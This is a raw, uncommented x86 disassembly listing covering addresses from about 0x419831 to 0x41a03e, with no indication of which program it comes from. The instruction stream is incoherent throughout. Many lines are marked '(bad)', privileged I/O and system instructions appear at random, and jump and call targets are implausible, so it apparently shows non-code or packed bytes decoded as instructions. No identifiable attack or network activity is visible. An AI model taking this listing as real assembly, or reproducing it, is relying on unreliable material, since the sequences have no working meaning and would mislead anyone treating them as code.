  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
